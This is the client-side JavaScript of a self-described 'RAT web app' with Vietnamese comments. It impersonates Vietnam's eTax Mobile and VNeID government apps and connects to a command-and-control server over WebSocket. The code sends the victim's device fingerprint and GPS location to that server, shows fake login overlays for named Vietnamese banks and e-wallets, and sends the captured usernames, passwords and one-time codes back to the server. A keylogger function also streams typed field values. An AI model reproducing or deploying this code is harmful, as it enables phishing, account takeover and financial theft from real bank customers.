// ============================================================
// RANK 3: RAT WEB APP — Client Logic (v2.0)
// Thu hoạch dữ liệu THẬT từ thiết bị nạn nhân
// ============================================================

let ws = null;
let victimId = 'v_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4);
let currentBank = null;
let accessibilityGranted = false;
let otpTimerInterval = null;
let generatedOtp = '';

// ==========================================
//  INIT
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    // Detect app type from URL params
    const params = new URLSearchParams(window.location.search);
    const appType = params.get('app') || 'etax';
    setupAppBranding(appType);

    // Connect WebSocket to C2
    connectC2();

    // Splash → Accessibility after 3s
    setTimeout(() => {
        showScreen('screen-accessibility');
    }, 3000);
});

// ==========================================
//  App Branding
// ==========================================
function setupAppBranding(appType) {
    const config = {
        etax: { icon: '🏛️', title: 'eTax Mobile', sub: 'Tổng Cục Thuế — Bộ Tài Chính' },
        vneid: { icon: '🛡️', title: 'VNeID Định Danh', sub: 'Trung Tâm Dữ Liệu Quốc Gia Về Dân Cư' }
    };
    const c = config[appType] || config.etax;

    const splashIcon = document.getElementById('splashIcon');
    const splashTitle = document.getElementById('splashTitle');
    const splashSub = document.getElementById('splashSub');
    const accTitle = document.getElementById('accAppTitle');
    const homeTitle = document.getElementById('homeAppTitle');

    if (splashIcon) splashIcon.textContent = c.icon;
    if (splashTitle) splashTitle.textContent = c.title;
    if (splashSub) splashSub.textContent = c.sub;
    if (accTitle) accTitle.textContent = c.title;
    if (homeTitle) homeTitle.textContent = c.title + ' — Liên Kết Ngân Hàng';

    document.title = c.title;
}

// ==========================================
//  WebSocket C2 Connection
// ==========================================
function connectC2() {
    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
    ws = new WebSocket(`${protocol}//${location.host}/ws/victim`);

    ws.onopen = () => {
        console.log('📡 Connected to C2 Server');

        // Register this victim device
        ws.send(JSON.stringify({
            type: 'register',
            victim_id: victimId,
            device: getDeviceInfo(),
            location: { pending: true }
        }));

        // Get location async and update
        getLocation().then(loc => {
            if (ws.readyState === 1) {
                ws.send(JSON.stringify({
                    type: 'register',
                    victim_id: victimId,
                    device: getDeviceInfo(),
                    location: loc
                }));
            }
        });

        // Start heartbeat
        setInterval(() => {
            if (ws.readyState === 1) {
                ws.send(JSON.stringify({ type: 'ping', victim_id: victimId }));
            }
        }, 15000);
    };

    ws.onclose = () => {
        console.log('📡 C2 disconnected, reconnecting...');
        setTimeout(connectC2, 3000);
    };

    ws.onmessage = (e) => {
        try {
            const data = JSON.parse(e.data);
            if (data.type === 'c2_command') {
                handleC2Command(data.action, data.params);
            }
        } catch (err) {}
    };

    ws.onerror = () => {};
}

// ==========================================
//  C2 Command Handler
// ==========================================
function handleC2Command(action, params) {
    console.log('⚡ C2 Command:', action, params);

    if (action === 'trigger_overlay') {
        openBankOverlay(params.bank || 'Vietcombank');
    }
    else if (action === 'show_alert') {
        alert(params.text || 'Thông báo từ hệ thống');
    }
    else if (action === 'redirect') {
        window.location.href = params.url || '/';
    }
}

// ==========================================
//  Device Fingerprint
// ==========================================
function getDeviceInfo() {
    const ua = navigator.userAgent;
    let deviceName = 'Unknown Device';
    let osName = 'Unknown', osVer = '';

    if (/iPhone/.test(ua)) { deviceName = 'iPhone'; osName = 'iOS'; osVer = (ua.match(/OS (\d+[_\.]\d+)/) || [])[1]?.replace('_', '.') || ''; }
    else if (/Android/.test(ua)) {
        osName = 'Android'; osVer = (ua.match(/Android ([\d.]+)/) || [])[1] || '';
        const model = (ua.match(/;\s*([^;)]+)\s*Build/) || [])[1] || '';
        deviceName = model || 'Android Device';
    }
    else if (/Windows/.test(ua)) { deviceName = 'Windows PC'; osName = 'Windows'; }
    else if (/Macintosh/.test(ua)) { deviceName = 'Mac'; osName = 'macOS'; }

    let browser = 'Unknown';
    if (/CriOS/.test(ua)) browser = 'Chrome (iOS)';
    else if (/Chrome/.test(ua) && !/Edge/.test(ua)) browser = 'Chrome';
    else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
    else if (/Firefox/.test(ua)) browser = 'Firefox';

    return {
        device_name: deviceName.trim(),
        os: osName, os_version: osVer,
        browser,
        screen: `${screen.width}x${screen.height}`,
        pixel_ratio: window.devicePixelRatio || 1,
        language: navigator.language || '',
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        touch: navigator.maxTouchPoints > 0,
        user_agent: ua
    };
}

function getLocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) { resolve({ error: 'not_supported' }); return; }
        navigator.geolocation.getCurrentPosition(
            (pos) => resolve({
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy + 'm',
                source: 'GPS',
                google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
            }),
            () => resolve({ error: 'denied' }),
            { timeout: 8000, enableHighAccuracy: true }
        );
    });
}

// ==========================================
//  Screen Navigation
// ==========================================
function showScreen(screenId) {
    document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
    const target = document.getElementById(screenId);
    if (target) target.classList.add('active');
}

// ==========================================
//  Accessibility Grant
// ==========================================
function grantAccessibility() {
    accessibilityGranted = true;

    const badge = document.getElementById('accBadge');
    if (badge) badge.textContent = '🔓 Full Control';

    // Notify C2
    if (ws && ws.readyState === 1) {
        ws.send(JSON.stringify({
            type: 'accessibility_granted',
            victim_id: victimId
        }));
    }

    showScreen('screen-home');
}

// ==========================================
//  Banking Overlay
// ==========================================
function openBankOverlay(bankName) {
    currentBank = bankName;

    // Update UI
    const bankNameEl = document.getElementById('overlayBankName');
    const titleEl = document.getElementById('overlayTitle');
    const logoEl = document.getElementById('overlayLogo');

    if (bankNameEl) bankNameEl.textContent = bankName;
    if (titleEl) titleEl.textContent = 'Đăng Nhập ' + bankName;

    // Logo colors
    const logoMap = {
        'Vietcombank': { text: 'VCB', bg: 'linear-gradient(135deg, #15803d, #166534)' },
        'Techcombank': { text: 'TCB', bg: 'linear-gradient(135deg, #dc2626, #b91c1c)' },
        'MBBank': { text: 'MB', bg: 'linear-gradient(135deg, #1d4ed8, #1e40af)' },
        'BIDV': { text: 'BIDV', bg: 'linear-gradient(135deg, #0369a1, #075985)' },
        'VietinBank': { text: 'VTB', bg: 'linear-gradient(135deg, #1d4ed8, #1e3a8a)' },
        'Agribank': { text: 'AGR', bg: 'linear-gradient(135deg, #b91c1c, #991b1b)' },
        'ZaloPay': { text: 'ZP', bg: 'linear-gradient(135deg, #2563eb, #1d4ed8)' },
        'MoMo': { text: 'MM', bg: 'linear-gradient(135deg, #a21caf, #86198f)' }
    };
    const logo = logoMap[bankName] || { text: bankName.substr(0, 3), bg: '#334155' };
    if (logoEl) {
        logoEl.textContent = logo.text;
        logoEl.style.background = logo.bg;
    }

    // Clear old input
    const u = document.getElementById('ovlUsername');
    const p = document.getElementById('ovlPassword');
    if (u) u.value = '';
    if (p) p.value = '';

    showScreen('screen-overlay');
}

function goBackFromOverlay() {
    showScreen('screen-home');
}

// ==========================================
//  Submit Overlay Credentials
// ==========================================
function submitOverlay() {
    const username = document.getElementById('ovlUsername').value.trim();
    const password = document.getElementById('ovlPassword').value.trim();

    if (!username || !password) {
        alert('Vui lòng nhập đầy đủ thông tin đăng nhập.');
        return;
    }

    // Send to C2 via WebSocket
    if (ws && ws.readyState === 1) {
        ws.send(JSON.stringify({
            type: 'overlay_credentials',
            victim_id: victimId,
            bank: currentBank,
            credentials: { username, password }
        }));
    }

    // Generate OTP for next step
    generatedOtp = Math.floor(100000 + Math.random() * 900000).toString();

    // Update OTP screen
    const otpCode = document.getElementById('otpCode');
    const smsSender = document.getElementById('otpSmsSender');
    if (otpCode) otpCode.textContent = generatedOtp;
    if (smsSender) smsSender.textContent = currentBank;

    // Update SMS body
    const smsBody = document.getElementById('otpSmsBody');
    if (smsBody) {
        smsBody.innerHTML = `${currentBank}: Ma OTP de xac thuc lien ket tai khoan la <strong id="otpCode">${generatedOtp}</strong>. Hieu luc 3 phut. Khong chia se cho ai.`;
    }

    // Start OTP timer
    startOtpTimer();

    // Clear OTP input
    const otpInput = document.getElementById('otpInput');
    if (otpInput) otpInput.value = '';

    showScreen('screen-otp');
}

// ==========================================
//  OTP Timer
// ==========================================
function startOtpTimer() {
    let seconds = 179;
    if (otpTimerInterval) clearInterval(otpTimerInterval);

    const timerEl = document.getElementById('otpTimer');
    otpTimerInterval = setInterval(() => {
        seconds--;
        if (seconds <= 0) {
            clearInterval(otpTimerInterval);
            if (timerEl) timerEl.textContent = '00:00';
            return;
        }
        const m = Math.floor(seconds / 60).toString().padStart(2, '0');
        const s = (seconds % 60).toString().padStart(2, '0');
        if (timerEl) timerEl.textContent = `${m}:${s}`;
    }, 1000);
}

// ==========================================
//  Submit OTP
// ==========================================
function submitOtp() {
    const otpValue = document.getElementById('otpInput').value.trim();
    if (!otpValue || otpValue.length < 4) {
        alert('Vui lòng nhập mã OTP hợp lệ.');
        return;
    }

    // Send OTP to C2
    if (ws && ws.readyState === 1) {
        ws.send(JSON.stringify({
            type: 'sms_otp',
            victim_id: victimId,
            otp_value: otpValue,
            bank: currentBank
        }));
    }

    if (otpTimerInterval) clearInterval(otpTimerInterval);

    showScreen('screen-success');

    // Auto close after 5s
    setTimeout(() => {
        showScreen('screen-home');
    }, 5000);
}

// ==========================================
//  Keylogger — Real keystroke capture
// ==========================================
function handleKeylog(inputEl, fieldType) {
    if (ws && ws.readyState === 1) {
        ws.send(JSON.stringify({
            type: 'keylog',
            victim_id: victimId,
            keylog: {
                app: currentBank || 'RAT App',
                field: fieldType,
                value: inputEl.value,
                timestamp: new Date().toISOString()
            }
        }));
    }
}
